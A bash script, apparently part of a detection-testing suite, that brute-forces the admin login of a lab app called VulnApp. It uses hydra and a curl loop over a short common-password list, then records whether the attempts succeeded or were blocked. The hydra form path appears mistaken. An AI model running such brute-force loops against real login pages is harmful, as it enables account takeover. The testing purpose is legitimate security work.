#!/usr/bin/env bash
# =============================================================================
# 04 — Brute Force: Web Login Form
# Tool: hydra (HTTP POST form)
# SSS should detect: brute_force pattern (rapid HTTP POST to /login)
# =============================================================================
set -euo pipefail
source "$(dirname "${BASH_SOURCE[0]}")/common.sh"
attack_start "04_brute_web_login"

WORDLIST="/tmp/web_passwords.txt"
cat > "${WORDLIST}" <<'EOF'
password
123456
admin
admin123
letmein
sentinel
root
toor
changeme
qwerty
test
guest
password123
P@ssw0rd
Welcome1
Summer2024
password1
abc123
iloveyou
master
EOF

VULN_PORT="${VULN_APP_PORT:-8888}"

echo "[*] Verifying VulnApp is reachable on ${TARGET_IP}:${VULN_PORT}..."
if ! curl -sf "http://${TARGET_IP}:${VULN_PORT}/health" >/dev/null 2>&1; then
    echo "[!] VulnApp is not reachable. Marking as failed."
    record_result "false" "VulnApp not reachable on port ${VULN_PORT}." ""
    exit 0
fi

echo "[*] Running HTTP form brute force against ${TARGET_IP}:${VULN_PORT}/login..."
hydra_output=$(timeout "${ATTACK_TIMEOUT}" \
    hydra -l admin -P "${WORDLIST}" \
    -t 8 -f -V \
    "${TARGET_IP}" \
    http-post-form \
    "/${VULN_PORT}:username=^USER^&password=^PASS^:Login Failed" \
    -s "${VULN_PORT}" 2>&1) || true

# Also try with curl-based brute force (more reliable for simple forms)
echo "[*] Running curl-based brute force as backup..."
curl_success=false
while IFS= read -r pass; do
    response=$(curl -s -o /dev/null -w "%{http_code}" \
        --max-time 5 \
        -X POST "http://${TARGET_IP}:${VULN_PORT}/login" \
        -d "username=admin&password=${pass}" 2>/dev/null) || true
    if [[ "${response}" == "200" ]]; then
        curl_success=true
        curl_cred="admin:${pass}"
        break
    fi
    # If we get connection refused, the attack is being blocked
    if [[ "${response}" == "000" ]]; then
        break
    fi
done < "${WORDLIST}"

if ${curl_success}; then
    evidence="Web login credentials found via brute force: ${curl_cred}"
    record_result "true" "${evidence}" "${hydra_output}"
elif echo "${hydra_output}" | grep -q "\[${VULN_PORT}\]"; then
    found_line=$(echo "${hydra_output}" | grep "\[${VULN_PORT}\]" | head -1)
    evidence="Hydra found credentials: ${found_line}"
    record_result "true" "${evidence}" "${hydra_output}"
else
    blocked=$(echo "${hydra_output}" | grep -ciE "refused|timeout|blocked|reset" || true)
    if [[ "${blocked}" -gt 0 ]] || [[ "${response:-}" == "000" ]]; then
        evidence="Web brute force was blocked/connections refused."
        record_result "false" "${evidence}" "${hydra_output}"
    else
        evidence="Brute force ran but did not find valid credentials."
        record_result "true" "${evidence}" "${hydra_output}"
    fi
fi

rm -f "${WORDLIST}"
